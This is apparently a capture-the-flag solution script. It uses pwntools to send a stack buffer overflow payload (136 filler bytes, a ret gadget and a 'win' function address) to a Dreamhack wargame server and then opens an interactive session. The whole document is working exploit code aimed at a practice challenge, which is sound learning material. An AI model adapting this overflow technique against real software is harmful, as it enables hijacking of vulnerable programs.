from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9922
r = remote(HOST, PORT)

win = 0x401340
ret = 0x40101a
payload = b'A'*136 + p64(ret) + p64(win)

r.sendafter(b':', payload)

r.interactive()